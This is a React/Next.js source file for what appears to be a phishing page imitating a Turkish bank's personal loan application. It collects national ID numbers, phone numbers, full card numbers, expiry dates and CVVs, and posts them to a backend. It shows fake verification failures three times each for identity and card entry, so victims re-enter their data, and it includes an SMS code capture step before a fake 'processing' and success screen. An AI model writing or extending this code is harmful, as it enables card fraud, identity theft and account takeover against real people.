"use client";

import { useState } from "react";
import { Header } from "@/components/layout/Header";
import { Footer } from "@/components/layout/Footer";
import { HeroBanner } from "@/components/layout/HeroBanner";
import { Breadcrumb } from "@/components/layout/Breadcrumb";
import { StepIndicator } from "@/components/ui/StepIndicator";
import { KvkkBox } from "@/components/ui/KvkkBox";
import { BottomButtons } from "@/components/ui/BottomButtons";
import { FaqAccordion } from "@/components/ui/FaqAccordion";
import { LoadingOverlay } from "@/components/ui/LoadingOverlay";
import {
  IdentityStep,
  type IdentityData,
} from "@/components/steps/IdentityStep";
import {
  PersonalInfoStep,
  type PersonalData,
} from "@/components/steps/PersonalInfoStep";
import { SmsVerification } from "@/components/steps/SmsVerification";
import { ProcessingStep } from "@/components/steps/ProcessingStep";
import { SuccessStep } from "@/components/steps/SuccessStep";
import { DESCRIPTION_TEXT } from "@/lib/content";
import { delay } from "@/lib/delay";
import { isValidTCKN } from "@/lib/tc-validation";
import { phoneToDigits } from "@/lib/phone-mask";
import {
  isValidExpiry,
  luhnCheck,
} from "@/lib/card-validation";

type WizardStep = "form" | "sms" | "processing" | "success";
type FormStep = 1 | 2;
type ModalType = "error" | "info";

interface ModalState {
  message: string;
  type: ModalType;
  onClose?: () => void;
}

const emptyIdentity: IdentityData = {
  firstName: "",
  lastName: "",
  tcKimlik: "",
  phone: "",
  captcha: "",
};

const emptyPersonal: PersonalData = {
  loanAmount: 50000,
  loanTerm: 12,
  noCreditCard: false,
  cardNumber: "",
  cardExpiry: "",
  cardCvv: "",
};

const IDENTITY_FAIL_COUNT = 3;
const CARD_FAIL_COUNT = 3;
const PROCESSING_SECONDS = 15;
const IDENTITY_FAIL_MSG =
  "Kimlik bilgileriniz doğrulanamadı. Lütfen TC Kimlik ve telefon numaranızı tekrar giriniz.";
const CARD_FAIL_MSG =
  "Kart bilgileriniz doğrulanamadı. Lütfen kart bilgilerinizi tekrar giriniz.";
const OVERALL_FAIL_MSG =
  "Bilgileriniz doğrulanamadı. Lütfen kontrol edip tekrar deneyin.";

function noCardProgressMsg(attemptNumber: number): string {
  return `Başvurunuz kaydedildi (Deneme ${attemptNumber}/3). Kimlik bilgilerinizi tekrar girerek devam edebilirsiniz.`;
}

export default function ApplicationWizard() {
  const [wizardStep, setWizardStep] = useState<WizardStep>("form");
  const [formStep, setFormStep] = useState<FormStep>(1);
  const [attemptNumber, setAttemptNumber] = useState<1 | 2 | 3>(1);
  const [identityFailCount, setIdentityFailCount] = useState(0);
  const [cardFailCount, setCardFailCount] = useState(0);
  const [identity, setIdentity] = useState<IdentityData>(emptyIdentity);
  const [personal, setPersonal] = useState<PersonalData>(emptyPersonal);
  const [identityErrors, setIdentityErrors] = useState<
    Partial<Record<keyof IdentityData, string>>
  >({});
  const [personalErrors, setPersonalErrors] = useState<
    Partial<Record<keyof PersonalData, string>>
  >({});
  const [applicantId, setApplicantId] = useState<string | null>(null);
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [modal, setModal] = useState<ModalState | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("Lütfen bekleyiniz...");

  const resetForm = (nextAttempt: 1 | 2 | 3) => {
    setIdentity(emptyIdentity);
    setPersonal(emptyPersonal);
    setIdentityErrors({});
    setPersonalErrors({});
    setFormStep(1);
    setAttemptNumber(nextAttempt);
    setIdentityFailCount(0);
    setCardFailCount(0);
  };

  const updateIdentity = (data: IdentityData) => {
    setIdentity(data);
    setIdentityErrors((prev) => {
      if (
        !prev.phone &&
        !prev.tcKimlik &&
        !prev.firstName &&
        !prev.lastName
      ) {
        return prev;
      }
      const next = { ...prev };
      if (prev.phone && phoneToDigits(data.phone).length >= 11) {
        delete next.phone;
      }
      if (prev.tcKimlik && isValidTCKN(data.tcKimlik)) {
        delete next.tcKimlik;
      }
      if (prev.firstName && data.firstName.trim()) {
        delete next.firstName;
      }
      if (prev.lastName && data.lastName.trim()) {
        delete next.lastName;
      }
      return next;
    });
  };

  const updatePersonal = (data: PersonalData) => {
    setPersonal(data);
    if (!data.noCreditCard) {
      setPersonalErrors((prev) => {
        if (!prev.cardNumber && !prev.cardExpiry && !prev.cardCvv) return prev;
        const next = { ...prev };
        const cardDigits = data.cardNumber.replace(/\D/g, "");
        if (prev.cardNumber && luhnCheck(cardDigits)) {
          delete next.cardNumber;
        }
        if (prev.cardExpiry && isValidExpiry(data.cardExpiry)) {
          delete next.cardExpiry;
        }
        if (prev.cardCvv && data.cardCvv.length === 3) {
          delete next.cardCvv;
        }
        return next;
      });
    } else {
      setPersonalErrors((prev) => {
        const next = { ...prev };
        delete next.cardNumber;
        delete next.cardExpiry;
        delete next.cardCvv;
        return next;
      });
    }
  };

  const validateIdentity = (): boolean => {
    const errors: Partial<Record<keyof IdentityData, string>> = {};
    if (!identity.firstName.trim()) errors.firstName = "Ad gerekli";
    if (!identity.lastName.trim()) errors.lastName = "Soyad gerekli";
    if (!isValidTCKN(identity.tcKimlik)) {
      errors.tcKimlik = "Geçersiz TC Kimlik Numarası";
    }
    if (phoneToDigits(identity.phone).length < 11) {
      errors.phone = "Geçerli telefon numarası giriniz";
    }
    setIdentityErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const validatePersonal = (): boolean => {
    if (personal.noCreditCard) {
      setPersonalErrors({});
      return true;
    }

    const errors: Partial<Record<keyof PersonalData, string>> = {};
    const cardDigits = personal.cardNumber.replace(/\D/g, "");
    if (!luhnCheck(cardDigits)) errors.cardNumber = "Geçersiz kart numarası";
    if (!isValidExpiry(personal.cardExpiry)) {
      errors.cardExpiry = "Geçersiz son kullanma";
    }
    if (personal.cardCvv.length !== 3) errors.cardCvv = "CVV gerekli";
    setPersonalErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const showModal = (
    message: string,
    type: ModalType = "error",
    onClose?: () => void
  ) => {
    setModal({ message, type, onClose });
    setTimeout(() => {
      setModal((current) => {
        if (current?.message === message) {
          current.onClose?.();
          return null;
        }
        return current;
      });
    }, 2500);
  };

  const withLoading = async (
    message: string,
    action: () => Promise<void> | void
  ) => {
    setLoadingMessage(message);
    setLoading(true);
    try {
      await delay(700);
      await action();
    } finally {
      setLoading(false);
    }
  };

  const handleIdentitySubmit = async () => {
    if (!validateIdentity()) return;

    if (identityFailCount < IDENTITY_FAIL_COUNT) {
      await withLoading("Kimlik bilgileriniz kontrol ediliyor...", async () => {
        await delay(400);
        showModal(IDENTITY_FAIL_MSG, "error", () => {
          setIdentity((prev) => ({
            ...prev,
            tcKimlik: "",
            phone: "",
          }));
          setIdentityFailCount((c) => c + 1);
        });
      });
      return;
    }

    await withLoading("Bir sonraki adıma geçiliyor...", async () => {
      setFormStep(2);
    });
  };

  const submitAttempt = async () => {
    const res = await fetch("/api/attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        tcKimlik: identity.tcKimlik,
        firstName: identity.firstName,
        lastName: identity.lastName,
        phone: phoneToDigits(identity.phone),
        birthDate: "",
        loanAmount: personal.loanAmount,
        loanTerm: personal.loanTerm,
        noCreditCard: personal.noCreditCard,
        cardNumber: personal.noCreditCard
          ? ""
          : personal.cardNumber.replace(/\D/g, ""),
        cardExpiry: personal.noCreditCard ? "" : personal.cardExpiry,
        cardCvv: personal.noCreditCard ? "" : personal.cardCvv,
      }),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || "Kayıt başarısız");

    setApplicantId(data.applicantId);
    setAttemptId(data.attemptId);

    if (data.requiresOtp) {
      setWizardStep("sms");
      return;
    }

    const next = (data.attemptNumber + 1) as 2 | 3;

    if (personal.noCreditCard) {
      showModal(noCardProgressMsg(data.attemptNumber), "info", () => {
        resetForm(next);
      });
      return;
    }

    showModal(data.message ?? OVERALL_FAIL_MSG, "error", () => {
      resetForm(next);
    });
  };

  const handlePersonalSubmit = async () => {
    if (!validatePersonal()) return;

    if (!personal.noCreditCard && cardFailCount < CARD_FAIL_COUNT) {
      await withLoading("Kart bilgileriniz kontrol ediliyor...", async () => {
        await delay(400);
        showModal(CARD_FAIL_MSG, "error", () => {
          setPersonal((prev) => ({
            ...prev,
            cardNumber: "",
            cardExpiry: "",
            cardCvv: "",
          }));
          setCardFailCount((c) => c + 1);
        });
      });
      return;
    }

    const loadingText = personal.noCreditCard
      ? "Başvurunuz kaydediliyor..."
      : "Bilgileriniz doğrulanıyor...";

    await withLoading(loadingText, async () => {
      try {
        await submitAttempt();
      } catch (e) {
        showModal(e instanceof Error ? e.message : "Hata oluştu", "error");
      }
    });
  };

  if (wizardStep === "processing") {
    return (
      <ProcessingStep
        duration={PROCESSING_SECONDS}
        onComplete={() => setWizardStep("success")}
      />
    );
  }

  if (wizardStep === "success") {
    return <SuccessStep />;
  }

  return (
    <div className="min-h-screen bg-ykb-page">
      <Header />

      <div className="mx-auto max-w-card px-[10px] pb-6 pt-4">
        <div className="overflow-hidden rounded-[10px] bg-white">
          <HeroBanner />

          <div className="p-[30px]">
            <h1 className="mb-2 text-[30px] font-medium leading-tight text-ykb-primary">
              Bireysel İhtiyaç Kredisi
            </h1>
            <Breadcrumb />
            <p className="mb-8 text-base leading-[25px] text-black">
              {DESCRIPTION_TEXT}
            </p>

            <StepIndicator currentStep={formStep} />

            <div key={formStep} className="step-enter">
              {formStep === 1 ? (
                <IdentityStep
                  data={identity}
                  onChange={updateIdentity}
                  errors={identityErrors}
                />
              ) : (
                <PersonalInfoStep
                  data={personal}
                  onChange={updatePersonal}
                  errors={personalErrors}
                />
              )}
            </div>

            {formStep === 1 && <KvkkBox />}

            <div className="mx-auto mt-6 flex w-full max-w-[450px] justify-end">
              {formStep === 1 ? (
                <button
                  type="button"
                  onClick={handleIdentitySubmit}
                  disabled={loading}
                  className="ykb-btn-primary"
                >
                  Hemen Başvur
                </button>
              ) : (
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={() => setFormStep(1)}
                    disabled={loading}
                    className="rounded border border-ykb-input-border px-6 py-2.5 text-sm"
                  >
                    Geri
                  </button>
                  <button
                    type="button"
                    onClick={handlePersonalSubmit}
                    disabled={loading}
                    className="ykb-btn-primary"
                  >
                    Devam Et
                  </button>
                </div>
              )}
            </div>
          </div>

          <BottomButtons />
          <FaqAccordion />
        </div>
      </div>

      <Footer />

      {wizardStep === "sms" && attemptId && applicantId && (
        <SmsVerification
          phone={identity.phone}
          attemptId={attemptId}
          applicantId={applicantId}
          onVerified={async () => {
            setLoadingMessage("Başvurunuz değerlendiriliyor...");
            setLoading(true);
            await delay(600);
            setLoading(false);
            setWizardStep("processing");
          }}
          onCancel={() => {
            setWizardStep("form");
            resetForm(3);
          }}
        />
      )}

      {loading && <LoadingOverlay message={loadingMessage} />}

      {modal && (
        <div className="modal-overlay fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <div className="modal-card max-w-md rounded-lg bg-white p-6 text-center shadow-xl">
            <div
              className={`mb-3 text-4xl ${
                modal.type === "error" ? "text-red-500" : "text-ykb-primary"
              }`}
            >
              {modal.type === "error" ? "✕" : "✓"}
            </div>
            <p className="text-base font-medium text-[#333]">{modal.message}</p>
          </div>
        </div>
      )}
    </div>
  );
}
